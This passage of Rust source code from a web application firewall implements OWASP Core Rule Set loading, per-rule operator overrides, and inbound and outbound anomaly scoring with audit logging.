            return Err(RejectReason::InvalidValueType {
                operator: operator.to_owned(),
                expected: "string or list of strings",
            });
        }
    };
    if phrases.is_empty() {
        return Err(RejectReason::PatternSet("no phrases".to_owned()));
    }
    build_automaton(&phrases).map_err(RejectReason::PatternSet)
}

/// Read a CRS `.data` wordlist and compile it into an automaton.
///
/// Blank lines and `#` comments are skipped and every entry is trimmed, which
/// is how `ModSecurity` reads `@pmFromFile` lists.
fn build_wordlist(path: &Path) -> WordlistResult {
    let content = std::fs::read_to_string(path).map_err(|e| format!("cannot read {}: {e}", path.display()))?;
    let patterns: Vec<&str> = content
        .lines()
        .map(str::trim)
        .filter(|line| !line.is_empty() && !line.starts_with('#'))
        .collect();
    if patterns.is_empty() {
        return Err(format!("{} contains no usable patterns", path.display()));
    }
    debug!("OWASP CRS wordlist {} → {} patterns", path.display(), patterns.len());
    build_automaton(&patterns).map_err(|e| format!("{}: {e}", path.display()))
}

/// `MatchKind::Standard` is used because callers only need "does any phrase
/// occur"; ASCII case-insensitivity mirrors CRS's `t:lowercase` transform.
fn build_automaton(patterns: &[&str]) -> Result<Arc<AhoCorasick>, String> {
    AhoCorasickBuilder::new()
        .match_kind(MatchKind::Standard)
        .ascii_case_insensitive(true)
        .build(patterns)
        .map(Arc::new)
        .map_err(|e| e.to_string())
}

// ── OWASPCheck ────────────────────────────────────────────────────────────────

/// WAF checker implementing a subset of the `OWASP` CRS.
pub struct OWASPCheck {
    /// Request-phase rules (`ModSecurity` `phase:1` / `phase:2`).
    rules: Vec<CompiledRule>,
    /// Response-phase rules (`phase:3` / `phase:4`) — every rule that reads
    /// `RESPONSE_BODY` or `RESPONSE_STATUS`. Held apart from [`Self::rules`] so
    /// neither pipeline walks the other's rules; see [`Loader::finish`].
    response_rules: Vec<CompiledRule>,
    /// Load-time metadata for [`Self::rules`], same order, same length.
    meta: Vec<RuleMeta>,
    /// Load-time metadata for [`Self::response_rules`], same order, same length.
    response_meta: Vec<RuleMeta>,
    /// Rule id (both spellings) → position, built once at load time. Used by the
    /// override loader and the admin API; never touched on the request path.
    by_id: HashMap<Box<str>, RuleIndex>,
    /// Operator overrides, published atomically by [`Self::load_overrides`].
    ///
    /// `None` — no override anywhere, which is the shipped state — costs the
    /// request path one wait-free atomic load and nothing else. See the module
    /// header of `checks/bot.rs` for why this is an `ArcSwap` and not a lock.
    overrides: ArcSwapOption<OverrideSnapshot>,
    summary: LoadSummary,
    /// Severity weights and the blocking threshold. Defaults to the upstream
    /// CRS v4.25.0 numbers; [`Self::with_config`] replaces them from the TOML.
    scoring: AnomalyScoring,
    /// Rule-hit audit log. `None` — the default and the shipped configuration —
    /// means nothing is recorded and the check behaves exactly as it did before
    /// the log existed. See [`crate::audit_log`].
    audit: Option<Arc<AuditLogSink>>,
}

impl OWASPCheck {
    /// Create by loading rules from `rules/owasp-crs/` relative to the
    /// current working directory.
    ///
    /// # Degradation policy
    ///
    /// The check is one of ~18 detection phases in front of customer traffic,
    /// and this constructor is infallible by construction (the engine builds
    /// it during startup wiring), so a broken rule set must not translate into
    /// "block every request" — that would turn a configuration defect into a
    /// total outage while the other phases still work.  Instead the load is
    /// *loud*: unreadable sources are `ERROR`, rejected rules are `WARN` with
    /// their ids, and [`LoadSummary::is_degraded`] exposes the state for
    /// health reporting.  When the directory yields zero enforceable rules the
    /// minimal embedded set is substituted (strictly better than none) and the
    /// substitution is logged at `ERROR` and recorded in the summary.
    pub fn new() -> Self {
        let dir = Path::new(DEFAULT_RULES_DIR);
        if !dir.is_dir() {
            warn!(
                "{DEFAULT_RULES_DIR}/ not found; using the minimal embedded OWASP rule set — \
                 full CRS coverage is NOT active"
            );
            return Self::embedded_fallback(LoadSummary::default());
        }

        let loaded = Self::from_directory(dir);
        if loaded.rule_count() > 0 {
            return loaded;
        }

        error!(
            "{DEFAULT_RULES_DIR}/ exists but produced 0 enforceable rules ({} declared, {} rejected, \
             {} unreadable source(s)); substituting the minimal embedded rule set — CRS coverage is effectively OFF",
            loaded.summary.attempted,
            loaded.summary.rejected.len(),
            loaded.summary.source_errors.len()
        );
        Self::embedded_fallback(loaded.summary)
    }

    /// Compile the embedded rule set, carrying `prior` diagnostics forward so
    /// the failed on-disk attempt stays visible in [`Self::load_summary`].
    fn embedded_fallback(prior: LoadSummary) -> Self {
        let mut check = Self::from_yaml_at(EMBEDDED_RULES_YAML, EMBEDDED_ORIGIN, None);
        check.summary.used_embedded_fallback = true;
        check.summary.attempted = check.summary.attempted.saturating_add(prior.attempted);
        check.summary.rejected.extend(prior.rejected);
        check.summary.source_errors.extend(prior.source_errors);
        check
    }

    /// Load all `.yaml` files from a directory, merging their rule lists.
    ///
    /// `pm_from_file` wordlists are resolved against `<dir>/data/`.  Files are
    /// visited in sorted order so first-match rule precedence does not depend
    /// on filesystem iteration order.
    pub fn from_directory(dir: &Path) -> Self {
        let mut loader = Loader::new(Some(dir.join(DATA_SUBDIR)));

        match std::fs::read_dir(dir) {
            Ok(entries) => {
                let mut paths: Vec<PathBuf> = entries
                    .flatten()
                    .map(|entry| entry.path())
                    .filter(|path| path.extension().and_then(OsStr::to_str) == Some("yaml"))
                    .collect();
                paths.sort();
                for path in paths {
                    let label = path.display().to_string();
                    match std::fs::read_to_string(&path) {
                        Ok(content) => loader.add_source(&label, &content),
                        Err(e) => loader.push_source_error(label, e.to_string()),
                    }
                }
            }
            Err(err) => loader.push_source_error(dir.display().to_string(), err.to_string()),
        }

        loader.finish(&dir.display().to_string())
    }

    /// Create from a YAML string (single-document, `RuleSet` format).
    ///
    /// `pm_from_file` rules are rejected (no data directory is associated with
    /// an in-memory source); use [`Self::from_yaml_with_data_dir`] to supply
    /// one.
    pub fn from_yaml(yaml: &str) -> Self {
        Self::from_yaml_at(yaml, INLINE_ORIGIN, None)
    }

    /// Like [`Self::from_yaml`], but resolves `pm_from_file` wordlists against
    /// `data_dir`.
    pub fn from_yaml_with_data_dir(yaml: &str, data_dir: &Path) -> Self {
        Self::from_yaml_at(yaml, INLINE_ORIGIN, Some(data_dir.to_path_buf()))
    }

    fn from_yaml_at(yaml: &str, origin: &str, data_dir: Option<PathBuf>) -> Self {
        let mut loader = Loader::new(data_dir);
        loader.add_source(origin, yaml);
        loader.finish(origin)
    }

    /// Try to load from a single YAML file, falling back to defaults on error.
    pub fn from_file_or_default(path: &Path) -> Self {
        match std::fs::read_to_string(path) {
            Ok(content) => {
                debug!("Loading OWASP rules from {}", path.display());
                Self::from_yaml_at(
                    &content,
                    &path.display().to_string(),
                    path.parent().map(Path::to_path_buf),
                )
            }
            Err(e) => {
                warn!(
                    "Cannot read OWASP rule file {} ({e}); falling back to the default rule set",
                    path.display()
                );
                Self::new()
            }
        }
    }

    /// Number of rules that are actually enforced, across both phases.  Rules
    /// declared in the source but rejected at load time are **not** counted.
    pub const fn rule_count(&self) -> usize {
        self.rules.len().saturating_add(self.response_rules.len())
    }

    /// Number of enforced **request-phase** rules.
    pub const fn request_rule_count(&self) -> usize {
        self.rules.len()
    }

    /// Number of enforced **response-phase** rules.
    ///
    /// This is what the gateway wiring tests before it registers the check as a
    /// [`ResponseCheck`]: with no response rule loaded there is nothing for the
    /// response pipeline to do, and registering anyway would turn on response
    /// buffering for no benefit.
    pub const fn response_rule_count(&self) -> usize {
        self.response_rules.len()
    }

    /// Full account of the last load — declared vs. enforced counts, rejection
    /// reasons and affected rule ids, and unreadable sources.
    pub const fn load_summary(&self) -> &LoadSummary {
        &self.summary
    }

    // ── Operator overrides ────────────────────────────────────────────────────

    /// Replace the operator override layer, atomically.
    ///
    /// In-flight requests finish against the previous snapshot and the next one
    /// picks up the new states; no request ever observes a half-built table and
    /// no request ever waits for this call. Nothing is recompiled — an override
    /// only changes how an already-compiled rule is *treated*, which is the
    /// whole reason per-rule enable/disable is affordable here and is not in
    /// `checks/bot.rs`, where the signatures live in one merged `RegexSet`.
    ///
    /// Ids that name no loaded rule are reported in the returned
    /// [`OverrideLoadReport`] rather than dropped, because a typo that silently
    /// does nothing is exactly how an operator ends up believing a rule is off.
    pub fn load_overrides(&self, specs: &[RuleOverrideSpec]) -> OverrideLoadReport {
        if specs.is_empty() {
            let had = self.overrides.swap(None).is_some();
            if had {
                info!("OWASP CRS rule overrides cleared: every loaded rule is back to its declared action");
            }
            return OverrideLoadReport::default();
        }

        let mut report = OverrideLoadReport::default();
        let mut global = RuleStates::active(self.rules.len(), self.response_rules.len());
        // Host rows are applied on top of the global layer, so a host-scoped
        // `enabled = true` can cancel a global disable. That layering is
        // resolved here, once, rather than on every request.
        let mut host_specs: HashMap<&str, Vec<(RuleIndex, RuleState)>> = HashMap::new();

        for spec in specs {
            let Some(index) = self.by_id.get(spec.rule_id.trim()).copied() else {
                report.unknown_rule_ids.push(spec.rule_id.clone());
                continue;
            };
            report.applied = report.applied.saturating_add(1);
            match spec.host_code.as_deref() {
                None => global.set(index, spec.state),
                Some(host) => host_specs.entry(host).or_default().push((index, spec.state)),
            }
        }

        let per_host: HashMap<String, RuleStates> = host_specs
            .into_iter()
            .map(|(host, entries)| {
                let mut states = global.clone();
                for (index, state) in entries {
                    states.set(index, state);
                }
                (host.to_owned(), states)
            })
            .collect();

        report.hosts = per_host.len();
        let (disabled, log_only) =
            per_host
                .values()
                .chain(std::iter::once(&global))
                .fold((0usize, 0usize), |(d, l), states| {
                    let (sd, sl) = states.counts();
                    (d.max(sd), l.max(sl))
                });
        report.disabled = disabled;
        report.log_only = log_only;

        if report.disabled > 0 {
            warn!(
                "OWASP CRS rule overrides applied: {} rule(s) are now DISABLED and are not evaluated \
                 at all — each one is a detection the WAF no longer performs. {} rule(s) are \
                 log-only (recorded, no anomaly score). {} host-scoped scope(s).",
                report.disabled, report.log_only, report.hosts
            );
        } else {
            info!(
                "OWASP CRS rule overrides applied: {} override(s), {} log-only, {} host-scoped scope(s)",
                report.applied, report.log_only, report.hosts
            );
        }
        if !report.unknown_rule_ids.is_empty() {
            warn!(
                "{} rule override(s) name ids that are not in the loaded rule set and do nothing: {}",
                report.unknown_rule_ids.len(),
                report.unknown_rule_ids.join(", ")
            );
        }

        self.overrides
            .store(Some(Arc::new(OverrideSnapshot { global, per_host })));
        report
    }

    /// `true` when `rule_id` (either spelling) names a rule in the loaded set.
    ///
    /// The admin API and the CLI call this before writing a row, so an override
    /// for a rule that does not exist is a `400` the operator can act on rather
    /// than a row that quietly never applies.
    #[must_use]
    pub fn knows_rule(&self, rule_id: &str) -> bool {
        self.by_id.contains_key(rule_id.trim())
    }

    /// Every enforced rule with the state in force for `host_code`, in load
    /// order (request phase first, then response phase).
    ///
    /// `None` asks for the global layer — the states a host with no rows of its
    /// own is governed by.
    #[must_use]
    pub fn registry(&self, host_code: Option<&str>) -> Vec<RuleDescriptor> {
        let guard = self.overrides.load();
        let states = guard
            .as_ref()
            .map(|snapshot| host_code.map_or(&snapshot.global, |code| snapshot.for_host(code)))
            .map(|states| (states.request.as_ref(), states.response.as_ref()));

        let halves = [
            ("request", &self.rules, &self.meta, states.map(|(req, _)| req)),
            (
                "response",
                &self.response_rules,
                &self.response_meta,
                states.map(|(_, resp)| resp),
            ),
        ];
        let mut out = Vec::with_capacity(self.rule_count());
        for (phase, rules, meta, phase_states) in halves {
            for (position, rule) in rules.iter().enumerate() {
                let state = phase_states.and_then(|s| s.get(position)).copied().unwrap_or_default();
                out.push(RuleDescriptor {
                    id: rule.id.clone(),
                    crs_id: rule.crs_id,
                    name: rule.name.clone(),
                    category: meta.get(position).map_or_else(String::new, |m| m.category.to_string()),
                    source: meta.get(position).map_or_else(String::new, |m| m.source.to_string()),
                    severity: rule.severity.label(),
                    score: match rule.action {
                        RuleAction::Score => self.scoring.score_for(rule.severity),
                        RuleAction::Deny | RuleAction::Log => 0,
                    },
                    paranoia: rule.paranoia,
                    phase,
                    declared_action: rule.action.label(),
                    state,
                });
            }
        }
        out
    }

    /// How many rules are disabled and how many are log-only in the global
    /// layer, for health reporting and the startup banner.
    #[must_use]
    pub fn override_counts(&self) -> (usize, usize) {
        self.overrides
            .load()
            .as_ref()
            .map_or((0, 0), |snapshot| snapshot.global.counts())
    }

    /// Install the operator-configured anomaly-scoring model and announce it.
    ///
    /// Kept separate from the constructors because they are infallible and run
    /// during engine wiring, before the TOML is threaded down. Consumes and
    /// returns `self` so the call site reads as one expression.
    #[must_use]
    pub fn with_config(mut self, cfg: &OwaspConfig) -> Self {
        self.scoring = AnomalyScoring::from(cfg);
        for line in self.scoring_broadcast() {
            info!("{line}");
        }
        self
    }

    /// Attach the rule-hit audit log.
    ///
    /// Without this the check records nothing, which is the shipped
    /// configuration: `audit_log.enabled` defaults to `false` and the engine
    /// then never builds a sink to attach.
    #[must_use]
    pub fn with_audit_log(mut self, sink: Option<Arc<AuditLogSink>>) -> Self {
        self.audit = sink;
        self
    }

    /// Human-readable description of the active decision model, for the startup
    /// log.
    ///
    /// An operator reading this must be able to answer two questions without
    /// opening the rule set: *what does it take to get blocked*, and *which of
    /// my rules can do it on their own*. The second is the part that changes
    /// behaviour, so it is stated as a count per severity rather than implied.
    #[must_use]
    pub fn scoring_broadcast(&self) -> Vec<String> {
        if !self.scoring.enabled {
            return vec![format!(
                "OWASP CRS anomaly scoring DISABLED (owasp.anomaly_scoring=false): the first \
                 matching rule of {} blocks, regardless of its severity. This is STRICTER than \
                 upstream CRS and is a known false-positive source.",
                self.rule_count()
            )];
        }

        let mut alone = 0usize;
        let mut needs_help = 0usize;
        let mut by_severity: BTreeMap<&str, usize> = BTreeMap::new();
        for rule in &self.rules {
            *by_severity.entry(rule.severity.label()).or_default() += 1;
            if rule.action == RuleAction::Deny || self.scoring.blocks_alone(rule.severity) {
                alone += 1;
            } else {
                needs_help += 1;
            }
        }
        let breakdown = by_severity
            .iter()
            .map(|(label, count)| format!("{label}={count}"))
            .collect::<Vec<_>>()
            .join(" ");

        let mut lines = vec![
            format!(
                "OWASP CRS anomaly scoring ACTIVE: block when the inbound score reaches {} \
                 (critical=+{} error=+{} warning=+{} notice=+{}), matching upstream CRS 949110.",
                self.scoring.inbound_threshold,
                self.scoring.critical,
                self.scoring.error,
                self.scoring.warning,
                self.scoring.notice,
            ),
            format!(
                "OWASP CRS enforced request rules: {} ({breakdown}). {alone} reach the threshold \
                 alone and still block on a single match; {needs_help} now need corroboration from \
                 another rule in the same request.",
                self.rules.len(),
            ),
        ];

        // The response half is stated separately, and only when it exists,
        // because its threshold is a different number and an operator who reads
        // "threshold 5" and assumes it governs both directions has been misled.
        if self.response_rules.is_empty() {
            lines.push(
                "OWASP CRS response-phase rules: none loaded — the response inspection channel \
                 stays closed and no response is buffered."
                    .to_owned(),
            );
            return lines;
        }
        let condemn_alone = self
            .response_rules
            .iter()
            .filter(|rule| rule.action == RuleAction::Deny || self.scoring.condemns_alone(rule.severity))
            .count();
        lines.push(format!(
            "OWASP CRS response-phase rules: {} enforced, acting when the OUTBOUND score reaches \
             {} (upstream CRS 959100 — a DIFFERENT threshold from the inbound {}). {condemn_alone} \
             of them reach it on a single match.",
            self.response_rules.len(),
            self.scoring.outbound_threshold,
            self.scoring.inbound_threshold,
        ));
        lines
    }

    /// Evaluate every in-scope rule and return the score plus the rules that
    /// produced it, or the rule that denied outright.
    ///
    /// # Why this does not stop at the threshold
    ///
    /// Stopping as soon as `score >= threshold` cannot change the verdict —
    /// every contribution is non-negative, so the sum only grows — and it would
    /// be a real saving if the loop were normally cut short. It is not: traffic
    /// that matches nothing (all ordinary traffic) already walks the whole rule
    /// set today, because there is no match to return on. The short-circuit
    /// would therefore only ever fire on requests that are about to be blocked,
    /// where the marginal work is bounded by the same rule count the benign path
    /// already pays, and its cost is a truncated answer to "which rules did
    /// this?" — precisely the question an operator asks about a block.
    /// Upstream has the same property: CRS logs every rule that fired and
    /// evaluates 949110 afterwards.
    ///
    /// A `deny` rule *does* short-circuit, because there the verdict is settled
    /// and no further rule can add to it.
    fn evaluate<'r>(&'r self, view: &RequestView<'_>, paranoia: u8, states: Option<&[RuleState]>) -> Evaluation<'r> {
        self.evaluate_rules(&self.rules, view, paranoia, states)
    }

    /// [`Self::evaluate`] over an explicit rule list, so the request and
    /// response pipelines share one scoring loop and cannot drift apart.
    ///
    /// `states`, when present, is the operator override table for this phase,
    /// indexed by the rule's position in `rules`. `None` — no override anywhere —
    /// is the shipped state and reduces the whole layer to one null check per
    /// rule against a value already in a register.
    fn evaluate_rules<'r>(
        &self,
        rules: &'r [CompiledRule],
        view: &RequestView<'_>,
        paranoia: u8,
        states: Option<&[RuleState]>,
    ) -> Evaluation<'r> {
        let mut score: u32 = 0;
        let mut contributions = Vec::new();

        for (position, rule) in rules.iter().enumerate() {
            let state = states.and_then(|s| s.get(position)).copied().unwrap_or_default();
            // Checked before `matches`: a disabled rule must cost a comparison,
            // not a regex.
            if state == RuleState::Disabled || rule.paranoia > paranoia || !rule.matches(view) {
                continue;
            }
            // An override to log-only outranks the declared action, `deny`
            // included: "record this, do not act on it" is the whole request.
            let action = if state == RuleState::LogOnly {
                RuleAction::Log
            } else {
                rule.action
            };
            match action {
                RuleAction::Deny => {
                    // Everything recorded so far travels with the verdict: a
                    // log-only rule that matched before the deny is still
                    // something the operator asked to see.
                    contributions.push(Contribution {
                        id: &rule.id,
                        crs_id: rule.crs_id,
                        name: &rule.name,
                        severity: rule.severity,
                        score: 0,
                        scored: true,
                    });
                    return Evaluation::Denied { rule, contributions };
                }
                RuleAction::Log => {
                    debug!(
                        "OWASP rule {} matched with action=log: recorded, contributes no score ({})",
                        rule.id, rule.name
                    );
                    contributions.push(Contribution {
                        id: &rule.id,
                        crs_id: rule.crs_id,
                        name: &rule.name,
                        severity: rule.severity,
                        score: 0,
                        scored: false,
                    });
                }
                RuleAction::Score => {
                    let points = self.scoring.score_for(rule.severity);
                    score = score.saturating_add(points);
                    contributions.push(Contribution {
                        id: &rule.id,
                        crs_id: rule.crs_id,
                        name: &rule.name,
                        severity: rule.severity,
                        score: points,
                        scored: true,
                    });
                }
            }
        }

        Evaluation::Scored { score, contributions }
    }

    /// Pre-scoring behaviour: the first rule that matches decides, and nothing
    /// accumulates.
    ///
    /// Shared by both phases' `anomaly_scoring = false` escape hatch. Records
    /// the audit block itself — including the record-only matches walked past on
    /// the way — so the caller only has to render a verdict.
    fn first_match<'r>(
        &self,
        rules: &'r [CompiledRule],
        view: &RequestView<'_>,
        paranoia: u8,
        states: Option<&[RuleState]>,
        ctx: &RequestCtx,
        phase: ScorePhase,
    ) -> Option<&'r CompiledRule> {
        let mut contributions: Vec<Contribution<'r>> = Vec::new();
        let mut hit = None;
        for (position, rule) in rules.iter().enumerate() {
            let state = states.and_then(|s| s.get(position)).copied().unwrap_or_default();
            if state == RuleState::Disabled || rule.paranoia > paranoia || !rule.matches(view) {
                continue;
            }
            // Record-only means record-only in this mode too: without the
            // `scored` flag a `log` rule would decide the request, which is the
            // opposite of what it asks for.
            let record_only = state == RuleState::LogOnly || rule.action == RuleAction::Log;
            contributions.push(Contribution {
                id: &rule.id,
                crs_id: rule.crs_id,
                name: &rule.name,
                severity: rule.severity,
                score: 0,
                scored: !record_only,
            });
            if !record_only {
                hit = Some(rule);
                break;
            }
        }
        self.record_audit(
            ctx,
            &contributions,
            ScoreVerdict {
                score: 0,
                threshold: 0,
                paranoia,
                reached_threshold: hit.is_some(),
                phase,
            },
        );
        hit
    }

    /// Hand one request's rule hits to the audit log, if one is attached.
    ///
    /// Both halves of the verdict go through here — the rules that fired and
    /// whether the total reached the threshold — because the sub-threshold case
    /// is precisely the one no other log records today.
    ///
    /// Record-only matches (`action: log`, or a rule an operator downgraded)
    /// are written here too, with `score 0`. That is the only place they appear:
    /// they contribute to no verdict, so without this line an operator watching
    /// a rule "in log mode" would be watching nothing at all.
    fn record_audit(&self, ctx: &RequestCtx, contributions: &[Contribution<'_>], verdict: ScoreVerdict) {
        let Some(sink) = self.audit.as_ref() else {
            return;
        };
        let hits: Vec<RuleHit<'_>> = contributions
            .iter()
            .map(|c| RuleHit {
                crs_id: c.crs_id,
                rule_ref: c.id,
                name: c.name,
                severity: c.severity.label(),
                score: c.score,
            })
            .collect();
        sink.record_rule_hits(ctx, &hits, verdict);
    }
}

/// The matches that actually moved the score.
///
/// Record-only matches are deliberately excluded from every operator-facing
/// count and from the leader choice: a rule that contributed nothing did not
/// block the request and must not be named as the reason it was blocked.
fn scored<'a, 'r>(contributions: &'a [Contribution<'r>]) -> impl Iterator<Item = &'a Contribution<'r>> {
    contributions.iter().filter(|c| c.scored)
}

/// How many rules contributed to the score.
fn scored_count(contributions: &[Contribution<'_>]) -> usize {
    scored(contributions).count()
}

/// Render the contributing rules for the block `detail`, capped at
/// [`MAX_NAMED_CONTRIBUTORS`] with the elision spelled out.
fn render_contributions(contributions: &[Contribution<'_>]) -> String {
    let total = scored_count(contributions);
    let mut rendered = scored(contributions)
        .take(MAX_NAMED_CONTRIBUTORS)
        .map(|c| format!("{} {} +{} ({})", c.id, c.severity.label(), c.score, c.name))
        .collect::<Vec<_>>()
        .join("; ");
    if let Some(hidden) = total.checked_sub(MAX_NAMED_CONTRIBUTORS)
        && hidden > 0
    {
        let _ = write!(rendered, "; and {hidden} more");
    }
    rendered
}

/// The heaviest scoring contributor, ties going to the earliest in load order.
///
/// `max_by_key` would hand back the *last* maximum and silently renumber the
/// verdict of every request where two rules of equal severity match.
fn leading_contributor<'a, 'r>(contributions: &'a [Contribution<'r>]) -> Option<&'a Contribution<'r>> {
    scored(contributions).fold(None, |best, candidate| match best {
        Some(best) if best.score >= candidate.score => Some(best),
        _ => Some(candidate),
    })
}

impl Default for OWASPCheck {
    fn default() -> Self {
        Self::new()
    }
}

impl Check for OWASPCheck {
    /// Forwards to the inherent [`OWASPCheck::check`].
    ///
    /// The decision lives on the inherent method rather than here because
    /// `OWASPCheck` implements **both** [`Check`] and [`ResponseCheck`], and two
    /// traits in scope offering `check` make every `owasp.check(&request_ctx)`
    /// call site ambiguous. An inherent method wins method resolution outright,
    /// so the request phase keeps reading the way it always did and the response
    /// phase is reached explicitly through `ResponseCheck::check`.
    fn check(&self, ctx: &RequestCtx) -> Option<DetectionResult> {
        Self::check(self, ctx)
    }
}

impl OWASPCheck {
    /// Decide the request the way upstream CRS decides it: accumulate an
    /// anomaly score across every rule that matches, then compare the total
    /// against the threshold (`REQUEST-949-BLOCKING-EVALUATION.conf`, rule
    /// `949110`).
    ///
    /// # Relationship to the other phases
    ///
    /// The score is **local to this check**. Lane 1's detectors (`sql_injection`,
    /// `xss`, `rce`, `dir_traversal`, …) are not CRS rules, carry no CRS
    /// severity, and keep their own first-match-wins semantics in
    /// `engine.rs`; nothing here reads or writes their verdicts, and a Lane 1
    /// block still short-circuits before this check is reached. The change is
    /// confined to how the OWASP phase turns its own matches into one verdict.
    ///
    /// # Relationship to the header / body phases
    ///
    /// `engine.rs` runs this check twice per request — once with the headers
    /// and once with the body populated — and the score is computed
    /// independently each time. That is not a lost accumulation: the body-phase
    /// pass re-evaluates every rule the header-phase pass evaluated, over a
    /// strictly larger request, so its score is at least the header-phase
    /// score. Carrying a running total between the two would double-count every
    /// header-surface rule.
    pub fn check(&self, ctx: &RequestCtx) -> Option<DetectionResult> {
        if !ctx.host_config.defense_config.owasp_set {
            return None;
        }

        // Use paranoia level from defense config (default 1)
        let paranoia = ctx.host_config.defense_config.owasp_paranoia;

        // Normalise each request surface once, not once per rule: every rule
        // that reads the query reads the same decoded query.
        let view = RequestView::new(ctx);

        // One wait-free load. `None` — no operator override anywhere, the
        // shipped state — leaves the loops below byte-for-byte what they were.
        let overrides = self.overrides.load();
        let states = overrides
            .as_ref()
            .map(|snapshot| snapshot.for_host(&ctx.host_config.code).request.as_ref());

        if !self.scoring.enabled {
            // Escape hatch: pre-scoring behaviour, first match wins.
            let rule = self.first_match(&self.rules, &view, paranoia, states, ctx, ScorePhase::Inbound)?;
            return Some(DetectionResult {
                rule_id: Some(rule.id.clone()),
                rule_name: rule.name.clone(),
                phase: Phase::Owasp,
                detail: format!("OWASP rule {} triggered ({})", rule.id, rule.name),
            });
        }

        let (score, contributions) = match self.evaluate(&view, paranoia, states) {
            Evaluation::Denied { rule, contributions } => {
                self.record_audit(
                    ctx,
                    &contributions,
                    ScoreVerdict {
                        score: 0,
                        threshold: self.scoring.inbound_threshold,
                        paranoia,
                        reached_threshold: true,
                        phase: ScorePhase::Inbound,
                    },
                );
                return Some(DetectionResult {
                    rule_id: Some(rule.id.clone()),
                    rule_name: rule.name.clone(),
                    phase: Phase::Owasp,
                    detail: format!(
                        "OWASP rule {} triggered with action=deny ({}) — blocked unconditionally, \
                         outside the anomaly score",
                        rule.id, rule.name
                    ),
                });
            }
            Evaluation::Scored { score, contributions } => (score, contributions),
        };

        let threshold = self.scoring.inbound_threshold;
        self.record_audit(
            ctx,
            &contributions,
            ScoreVerdict {
                score,
                threshold,
                paranoia,
                reached_threshold: score >= threshold,
                phase: ScorePhase::Inbound,
            },
        );
        if score < threshold {
            // The negative case needs to be as legible as the positive one: an
            // operator chasing a miss has to be able to see that rules *did*
            // fire and how far short they fell.
            let contributed = scored_count(&contributions);
            if contributed > 0 {
                debug!(
                    "OWASP CRS inbound anomaly score {score} is below the threshold {threshold} at \
                     paranoia {paranoia}: allowed. {contributed} rule(s) contributed: {}",
                    render_contributions(&contributions)
                );
            }
            return None;
        }

        // Name the heaviest contributor: it is the most useful single answer to
        // "what got me blocked", it is what the block page renders, and it keeps
        // a per-rule verdict meaningful. The full account lives in `detail`.
        let leader = leading_contributor(&contributions).map(|c| (c.id.to_owned(), c.name.to_owned()));
        let (rule_id, rule_name) =
            leader.unwrap_or_else(|| ("CRS-949110".to_owned(), "Inbound Anomaly Score Exceeded".to_owned()));

        Some(DetectionResult {
            rule_id: Some(rule_id),
            rule_name,
            phase: Phase::Owasp,
            detail: format!(
                "OWASP CRS inbound anomaly score {score} reached the threshold {threshold} at \
                 paranoia {paranoia} (CRS-949110); {} rule(s) contributed: {}",
                scored_count(&contributions),
                render_contributions(&contributions)
            ),
        })
    }
}

impl ResponseCheck for OWASPCheck {
    /// Decide one response window the way upstream CRS decides it: accumulate an
    /// **outbound** anomaly score across the `RESPONSE-95x` rules that match,
    /// then compare the total against `tx.outbound_anomaly_score_threshold`
    /// (`RESPONSE-959-BLOCKING-EVALUATION.conf`, rule `959100`).
    ///
    /// # Why this is not the inbound logic with a different rule list
    ///
    /// It is easy to reach for [`Check::check`]'s decision here and wrong twice
    /// over.
    ///
    /// * **The threshold is a different number.** Upstream initialises
    ///   `tx.inbound_anomaly_score_threshold` to 5 and
    ///   `tx.outbound_anomaly_score_threshold` to 4
    ///   (`REQUEST-901-INITIALIZATION.conf`), and `959100` compares against the
    ///   latter. Reusing 5 would silently under-enforce every `ERROR` response
    ///   rule, which is 15 of the 58.
    /// * **The accumulator is separate.** Rules `950130`…`956110` only ever
    ///   `setvar:'tx.outbound_anomaly_score_plN=+…'`; not one of them is
    ///   `deny`. Treating each of them as its own verdict — which is what
    ///   evaluating them under the request-phase first-match rule would do —
    ///   would make prx-waf strictly more aggressive than upstream on exactly
    ///   the phase where a false positive breaks a page the origin considers
    ///   correct.
    ///
    /// # Scope of one call
    ///
    /// The gateway calls this once per inspection window, so the score is a
    /// per-window total, not a per-response one. For a response inside the
    /// 64 KiB window that is the same thing; for a larger one, two rules that
    /// match in two different windows are not summed. Widening that would need
    /// the trait to carry per-response state, and the alternative — summing
    /// across windows without it — is not expressible. A single rule that
    /// reaches the threshold alone (every `ERROR`/`CRITICAL` response rule, with
    /// the shipped weights) is unaffected.
    fn check(&self, ctx: &ResponseCtx) -> Option<DetectionResult> {
        // Cheapest possible exits first: a build with no response rules, or a
        // host that has CRS switched off, must cost one comparison.
        if self.response_rules.is_empty() {
            return None;
        }
        let request = &ctx.request;
        if !request.host_config.defense_config.owasp_set {
            return None;
        }
        let paranoia = request.host_config.defense_config.owasp_paranoia;
        let view = RequestView::for_response(ctx);

        // Response rules carry their own override slice; the scope is still the
        // request's host, because that is the only host a response has.
        let overrides = self.overrides.load();
        let states = overrides
            .as_ref()
            .map(|snapshot| snapshot.for_host(&request.host_config.code).response.as_ref());

        if !self.scoring.enabled {
            // Escape hatch, matching the request phase: first match wins.
            let rule = self.first_match(
                &self.response_rules,
                &view,
                paranoia,
                states,
                request,
                ScorePhase::Outbound,
            )?;
            return Some(DetectionResult {
                rule_id: Some(rule.id.clone()),
                rule_name: rule.name.clone(),
                phase: Phase::Owasp,
                detail: format!("OWASP response rule {} triggered ({})", rule.id, rule.name),
            });
        }

        let (score, contributions) = match self.evaluate_rules(&self.response_rules, &view, paranoia, states) {
            Evaluation::Denied { rule, contributions } => {
                self.record_audit(
                    request,
                    &contributions,
                    ScoreVerdict {
                        score: 0,
                        threshold: self.scoring.outbound_threshold,
                        paranoia,
                        reached_threshold: true,
                        phase: ScorePhase::Outbound,
                    },
                );
                return Some(DetectionResult {
                    rule_id: Some(rule.id.clone()),
                    rule_name: rule.name.clone(),
                    phase: Phase::Owasp,
                    detail: format!(
                        "OWASP response rule {} triggered with action=deny ({}) — condemned \
                         unconditionally, outside the anomaly score",
                        rule.id, rule.name
                    ),
                });
            }
            Evaluation::Scored { score, contributions } => (score, contributions),
        };

        let threshold = self.scoring.outbound_threshold;
        self.record_audit(
            request,
            &contributions,
            ScoreVerdict {
                score,
                threshold,
                paranoia,
                reached_threshold: score >= threshold,
                phase: ScorePhase::Outbound,
            },
        );
        if score < threshold {
            let contributed = scored_count(&contributions);
            if contributed > 0 {
                debug!(
                    "OWASP CRS outbound anomaly score {score} is below the threshold {threshold} at \
                     paranoia {paranoia}: response delivered. {contributed} rule(s) contributed: {}",
                    render_contributions(&contributions)
                );
            }
            return None;
        }

